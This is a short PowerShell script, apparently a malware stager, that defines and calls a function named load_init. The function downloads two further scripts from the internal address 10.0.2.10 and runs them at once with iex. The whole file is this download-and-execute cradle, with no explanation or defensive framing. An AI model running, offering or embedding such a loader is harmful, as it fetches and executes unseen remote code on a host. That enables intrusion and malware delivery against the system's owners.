function load_init
{
	iex(new-object net.webclient).downloadString('http://10.0.2.10/s2.ps1')
	iex(new-object net.webclient).downloadString('http://10.0.2.10/s3.ps1')
}
load_init



